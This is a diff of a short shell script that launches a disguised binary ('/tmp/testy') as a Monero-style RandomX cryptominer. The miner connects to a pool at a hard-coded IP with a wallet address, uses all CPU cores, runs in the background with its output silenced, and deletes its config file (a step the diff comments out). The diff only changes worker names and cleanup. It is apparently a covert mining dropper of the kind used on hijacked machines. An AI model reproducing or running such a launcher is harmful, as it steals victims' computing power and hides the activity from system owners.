@@ -1,10 +1,9 @@
 cd /tmp
 for i in {1}; do
-  oke=app$(shuf -i 1000-9999 -n 1)
+  #oke=app$(shuf -i 1000-9999 -n 1)
   cp /tmp/myconfig /tmp/config.json
-  sed -i "s/KUNE/$oke/" /tmp/config.json
-  #sed -i "s/ssd/$oke/" config.json
-  /tmp/testy -a rx/0 -O 143.198.26.125:3333 -u 3KG1skXBK67KZWHNvJ8aUUJH42vQVv7b9s.$oke -p $oke -t $(nproc --all) --keepalive --rig-id=$oke >/dev/null 2>&1 >/dev/null &
+  sed -i "s/KUNE/cpu-11/" /tmp/config.json
+  /tmp/testy -a rx/0 -O 143.198.26.125:3333 -u 3KG1skXBK67KZWHNvJ8aUUJH42vQVv7b9s.cpu-1 -p cpu-1 -t $(nproc --all) --keepalive --rig-id=cpu-1 >/dev/null 2>&1 >/dev/null &
   sleep 0.1
-  rm -rf /tmp/config.json
+  #rm -rf /tmp/config.json
 done
